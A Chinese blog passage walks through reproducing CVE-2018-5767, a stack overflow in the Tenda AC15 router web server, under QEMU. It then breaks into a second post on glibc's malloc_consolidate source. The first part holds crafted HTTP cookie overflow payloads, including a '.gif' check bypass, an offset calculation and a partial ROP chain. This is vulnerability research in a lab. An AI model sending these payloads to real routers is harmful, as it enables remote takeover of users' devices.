<p>第三项指出了镜像的文件系统格式为Squashfs，类似的文件格式还有许多，一般都能被 binwalk 所识别。</p>
<p>接着就可以着手将文件系统取出来，使用dd 命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin bs=1 count=8549574 skip=1674524 of=image</span><br></pre></td></tr></table></figure></div>

<p>if 参数设置输入的文件，bs 是输入输出块的大小，count 是输入输出块的个数(抽取的总字节数可以理解为 bs * count)，skip 是从文件头开始的偏移量，of 指定输出字节的保存位置，这些数据在 binwalk 中都能找到。</p>
<p>执行这条命令需要比较长的时间，跑完得到一个名为image 的文件，这时再来 file 一下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">image: Squashfs filesystem, little endian, version 4.0, 8549574 bytes, 741 inodes, blocksize: 131072 bytes, created: Thu Nov 19 09:36:43 2015</span><br></pre></td></tr></table></figure></div>

<p>文件系统已经提取出来了，接下来就是解压出文件，和 NTFS FAT32 类似，Squashfs 是一种磁盘格式，可以直接使用来工具解码文件，这里我们用到的工具是 squashfs-tools，在 github 上面能找到源代码，也可以使用下面的命令直接安装</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line">sudo apt-get install build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line">./configure</span><br><span class="line">make </span><br></pre></td></tr></table></figure></div>

<p>然后找到工具中的unsquashfs_all.sh，使用下面的命令解压镜像</p>
<p>unsquashfs_all.sh image </p>
<p>到这里，路由器的固件已经被提取出来了，下面准备复现漏洞。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在bin 文件夹中找到存在漏洞的文件 httpd ，使用 checksec 看一下开启的保护：</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-1.png"
                      alt="image"
                ></p>
<p><strong>注：部分情况下checksec 检测的结果并不准确，需要通过动态调试进一步确定。</strong></p>
<p>32 位程序，只开启了 NX，丢进 IDA 开始分析，由于是复现漏洞，所以直接定位到函数 <strong>R7WebsSecurityHandler</strong>，按F5 查看反编译代码(代码比较多，只把关键的地方放上来)</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-2.png"
                      alt="image"
                ></p>
<p>结合上下文来理解这段代码，第100 行使用了函数 strstr 尝试在 (v22 + 46) 处找到 “password&#x3D;” 字符串的位置，其中 v22 + 46 是用户的 HTTP 请求，password 是请求中 cookie 的一个字段，如果找到了 password，就会进入接下来的逻辑，在第 102 行调用了函数 sscanf，使用正则匹配 “password&#x3D;” 之后的字符串，并将匹配出的结果存入变量 v35 中，结合 v35 的变量定义</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">char v35; // [sp+304h] [bp-1C0h]</span><br></pre></td></tr></table></figure></div>

<p>很明显这里是存在栈溢出的，代码没有判断字段的最大长度，直接将内容拷贝到栈上，如果用户精心构造一个password，那么可能有机会控制整个程序的流程，进而达到远程执行代码的目的。</p>
<p>在复现漏洞的时候经常会摸不到头脑，比如凭什么说v22 + 46 代表 http 请求，这个函数究竟想要干什么等等，加上没有真正的路由器，一切只能在 qemu 中模拟，想要真正从根本上理解漏洞的成因是比较困难的，解决办法只能是不断地分析关键函数并且根据程序功能猜测这些究竟是什么，有条件的话可以考虑搞来一台路由器模拟真实的环境，这或许能够解决一部分问题。</p>
<h2 id="搭建调试环境"><a href="#搭建调试环境" class="headerlink" title="搭建调试环境"></a>搭建调试环境</h2><p><strong>操作之前先拍摄快照！</strong></p>
<p>在从前，想要跨平台模拟运行其他平台的程序是很困难的，幸好一路大佬开发出了QEMU，关于 QEMU 的具体信息可在其官方网站上找到，实际上它就是一个虚拟机，能够虚拟大部分硬件设备，ARM 自然也包括在内，下面是一张关于 QEMU 的简图</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-3.png"
                      alt="image"
                ></p>
<p>它在宿主机上模拟了相应硬件的环境，并在这些模拟的环境上面运行客户系统，这种机制类似于VMware，无需关机重启，即可在一套硬件上运行多种不同的系统。</p>
<p>想要运行本例的程序，就需要先搭建好qemu 的环境，具体的操作步骤就不细说了，在百度上有大把的文章，重点是如何搭建 QEMU + GDB 的调试环境。</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install qemu </span><br><span class="line">sudo apt-get install qemu-user-static</span><br><span class="line">sudo apt-get install qemu-system</span><br></pre></td></tr></table></figure></div>

<p>如果你已经搭建好了qemu，应该可以使用下面的命令启动 httpd</p>
<p>qemu-arm -L &lt;抽取出的固件根目录&gt; httpd</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-4.png"
                      alt="image"
                ></p>
<p><strong>如果不能启动，可能是由于QEMU 没有装好或者 -L 选项的参数不正确。</strong></p>
<p>接下来要安装支持多种架构的gdb 调试器， linux 自带的 gdb 并不支持 ARM 指令集，需要安装 gdb-multiarch</p>
<p>sudo apt-get install gdb-multiarch </p>
<p>安装完成之后启动看看是否正常，推荐装上pwndbg 这个 gdb 插件，方便调试。</p>
<p>如果一切正常，下面就可以开始调试了，首先使用qemu 将程序跑起来</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-arm-static -g 1234 -L &lt;抽取出的固件根目录&gt; httpd</span><br></pre></td></tr></table></figure></div>

<p>然后打开gdb-multiarch，依次用下面的命令进行初始化设置并附加到程序上</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set sysroot &lt;抽取出的固件根目录&gt;</span><br><span class="line">file &lt;httpd文件的位置&gt;</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-5.png"
                      alt="image"
                ></p>
<p>不出意外的话就能使用gdb 调试程序了。</p>
<h2 id="搭建网络环境"><a href="#搭建网络环境" class="headerlink" title="搭建网络环境"></a>搭建网络环境</h2><p><strong>操作之前先拍摄快照！！！</strong></p>
<p>如果你按照上面的步骤操作完之后，调试程序应该是没有问题的，但是很可能会在一个名为check_network 函数上面栽跟头，按照函数名来推测，它应该是用来检测当前网络连接是否可用的，我们虽然搭建起了调试环境，但是并没有设置好网络环境，所以这个函数不会正常工作(返回值为 0)，如果你尝试将它的返回值修改为 1，程序可以正常运行，但是最终出现的 IP 地址会非常诡异，我分别使用两台机器进行了实验，一次 IP 地址位于日本，而另一次位于墨西哥…..  这就导致程序无法正常接收我们的请求，没法儿进行下一步操作了。</p>
<p>所以要先配置好qemu 的网络参数，首先安装必要的工具</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure></div>

<p>接着要修改网络配置，编辑&#x2F;etc&#x2F;network&#x2F;interfaces</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33  inet manual</span><br><span class="line">up ifconfig ens33  0.0.0.0 up</span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> bridge_ports ens33</span><br><span class="line"> bridge_maxwait 0 </span><br></pre></td></tr></table></figure></div>

<p>新建一个shell 脚本 &#x2F;etc&#x2F;qemu-ifup</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure></div>

<p>别忘了给脚本足够的权限，然后重启网络服务</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure></div>

<p>如果其中哪一步报错，尝试重启一下虚拟机。</p>
<p>这样，我们的网络环境就配置完成了，接下来开始着手复现漏洞。</p>
<h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><p>启动程序的命令</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -g 10000 ./bin/httpd</span><br></pre></td></tr></table></figure></div>

<p>启动之后在IDA 中选择 remote GDB debugger ，配置相应的参数然后连接上去即可调试。</p>
<p>首先试试看能不能触发漏洞，让程序崩溃。直接运行程序时会输出WeLoveLinux ，之后就没什么反应了，猜测进入了假死状态，使用 IDA 找到用到这个字符串的位置下断点，单步看看会发生什么。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-6.png"
                      alt="image"
                ></p>
<p>经过调试推测这个函数连接了某个服务，在正常情况下应该会返回1，但是我们使用 QEMU 模拟的环境，它连接不到相关服务，就会返回 0。我们需要手动 patch，可以使用 IDA 自带的 patch，也可以使用 keypatch 插件，将返回值 patch 成 1。</p>
<p>patch 好之后就可以正常运行啦，附一个截图</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-7.png"
                      alt="image"
                ></p>
<p>如果你看到类似的界面(特别是 IP 地址，一般是你的本机地址)，那就说明环境搭建的没有问题。</p>
<p>接着在有漏洞的函数R7WebsSecurityHandler 开头打一个断点，先打开具有拦截数据包功能的软件(比如 burp suite)，然后用浏览器访问 <code>http://&lt;IP&gt;/goform/execCommand</code></p>
<p>抓一个数据包，这个包的内容应该如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>

<p>为了触发漏洞，我们要手动添加一个Cookie 字段，例如我将数据包改造为 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line">Cache-Control: max-age=0 </span><br></pre></td></tr></table></figure></div>

<p>重放数据包，这时候程序应该会断在R7WebsSecurityHandler 函数头部，再 F9 运行程序(整个过程中可能会弹出一些警告，直接忽略，然后在接下来的窗口中点击 pass to app)，不出意外的话程序会终止运行，并且终端中会打印出段错误。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-8.png"
                      alt="image"
                ></p>
<p>接下来就是想办法利用漏洞了，其实IoT 的漏洞和 CTF 中的 pwn 题比较类似，利用思路也有部分相通之处，过程依旧是先检查保护，然后寻找漏洞，根据漏洞类型和开启的保护类型找到合适的利用方式，最后编写 exp。</p>
<p>首先让我们看看漏洞发生时stack 空间的情况。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-9.png"
                      alt="image"
                ></p>
<p>上图是sscanf 之前，我们看到它的三个参数和 IDA 伪代码识别的一致，单步步过 sscanf，然后检查对应的栈空间发现已经被字符 a 填充，继续单步，在步过 0x2dd48 代码之后就会触发异常，检查异常发生时的程序环境：</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-10.png"
                      alt="image"
                ></p>
<p>程序试图访问r3 寄存器指向的地址，但是此时 R3 已经变成了 0x61616161，也就是我们填入的内容，由于访问了非法地址，导致程序出错，异常退出。 </p>
<p>发生这种情况就说明输入覆盖了stack 上的关键数据，也就是说有机会通过精心构造一些数据来控制程序流程！参考网上的文章，如果 password 字段中包含 .gif 字符串，那么就会直接从当前函数中 return，而不会进入到读入 R3 寄存器这一支流程，所以我们重新构造一个满足条件的 payload</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gif&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>

<p>再次发送数据包，崩溃时的情况如图</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-11.png"
                      alt="image"
                ></p>
<p>当前的PC 指针(相当于 x86 中的 EIP)指向了 0x61616160，也就是我们填充的内容。</p>
<p>到这里可以大致推测一下这个函数的功能，应该是用来过滤一些非法输入的，但是由于本身的逻辑没有做好，导致本来应该保护软件安全的函数却自己出了问题。</p>
<p>下面需要计算一下到返回地址的偏移，首先需要知道一个重要的知识点，和x86 不同，ARM 指令集在函数返回时并不是依靠存储在栈上的地址，而是依靠 LR 寄存器，只有修改了 LR 寄存器，才能在函数返回时控制程序流程，幸运的是，我们分析的函数在返回时调用了 pop 指令，将存储在栈上的地址存放到 LR 寄存器中，所以给了我们控制程序流程的机会。构造以下 payload</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbccccccccccccccccccccccccccccccccddddddddqqqqqqqqeeeeeeee22222222rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrraaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz1111222233334444555566667777888899990000!!!!@@@@####$$$$%%%%^^^^&amp;&amp;&amp;&amp;****(((())))~~~~````++++====____----&#123;&#123;&#123;&#123;&#125;&#125;&#125;&#125;[[[[]]]]////&gt;&gt;&gt;&gt;&lt;&lt;&lt;&lt;.gif&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>



<p>然后正常操作，当执行到pop 指令的时候观察 stack 如下</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-12.png"
                      alt="image"
                ></p>
<p>通过当前状态，可以推算出padding 的长度为 447 个字节。</p>
<p>有了padding，接下来要考虑构造 ROP，与 ctf 中不同的一点是这种 web 服务在崩溃后一般会立刻重启，并且重启之后的 libc 地址和之前是相同的，所以爆破 libc 是比较常用的攻击手段，不过 qemu 没办法提供这种爆破 libc 的条件。</p>
<p>我们尝试手动修改一些地址，搞一个可以看到效果的利用链。 </p>
<p>首先运行到0x2de94 ，单步走几次到 pop 指令之前，然后使用命令 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set &#123;int&#125;&lt;your stack address&gt; = &lt;target address&gt;</span><br></pre></td></tr></table></figure></div>

<p>修改几个stack 的地址，比如我修改了几个地址如图:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-13.png"
                      alt="image"
                ></p>
<p>单步运行，会在终端中看到效果</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2018-5767-14.png"
                      alt="image"
                ></p>
<p>成功执行了puts 函数并输出我们的内容。</p>
<p>payload如下 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbbbbbbbbbbbbbbbbbfuckfuck&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>

<p>附：写完本文之后我又进行了几次调试，发现system 函数始终不能正常被执行，原因是 execve 这个调用一直提示 No such file or directory .  google 到几篇文章也没有具体的解决办法，初步猜测是 qemu 模拟环境不完善，导致找不到 &#x2F;bin&#x2F;sh ，不知道在真机上面能不能得到改善。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://www.freebuf.com/vuls/160040.html" >https://www.freebuf.com/vuls/160040.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://bbs.pediy.com/thread-225671.htm" >https://bbs.pediy.com/thread-225671.htm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/articles/wireless/166869.html" >https://www.freebuf.com/articles/wireless/166869.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>glibc 中的 malloc 与 free 概述 (二)</title>
    <url>/2019/03/15/glibc_analyse2/</url>
    <content><![CDATA[<h2 id="malloc-中的-consolidate"><a href="#malloc-中的-consolidate" class="headerlink" title="malloc 中的 consolidate"></a>malloc 中的 consolidate</h2><p>在 malloc 的流程中有几处调用到了这个函数，它的主要作用是遍历 fastbin 链表，将其中的堆块进行合并，插入到 unsorted bin 当中。</p>
<p>Update: 2020-11-02</p>
<span id="more"></span>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> __STD_C</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(av)</span> mstate av;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;  <span class="comment">// 首先判断分配区是否初始化，如果没有就调到最后初始化分配区</span></span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);  <span class="comment">// 获取 unsortedbin 链表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    <span class="comment">/* It is wrong to limit the fast bins to search using get_max_fast</span></span><br><span class="line"><span class="comment">       because, except for the main arena, all the others might have</span></span><br><span class="line"><span class="comment">       blocks in the high fast bins.  It&#x27;s not worth it anyway, just</span></span><br><span class="line"><span class="comment">       search all bins all the time.  */</span></span><br><span class="line">    maxfb = &amp;fastbin (av, fastbin_index(get_max_fast ()));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);  <span class="comment">// 获取最大的 fastbin 链表</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);  <span class="comment">// 取出第一条链表</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      p = *fb;  <span class="comment">// 取出链表的第一个堆块</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;  <span class="comment">// 判断表是否为空</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ATOMIC_FASTBINS</span></span><br><span class="line">	*fb = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">do</span> &#123;  <span class="comment">// 遍历链表</span></span><br><span class="line">	  check_inuse_chunk(av, p);</span><br><span class="line">	  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">	  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">	  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">	  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!prev_inuse(p)) &#123;  <span class="comment">// 判断是否可以后向合并</span></span><br><span class="line">	    prevsize = p-&gt;prev_size;</span><br><span class="line">	    size += prevsize;</span><br><span class="line">	    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">	    unlink(p, bck, fwd);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;   <span class="comment">// 判断当前堆块物理上的下一个堆块是否是 top chunk</span></span><br><span class="line">	    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (!nextinuse) &#123;  <span class="comment">// 判断是否可以前向合并</span></span><br><span class="line">	      size += nextsize;</span><br><span class="line">	      unlink(nextchunk, bck, fwd);</span><br><span 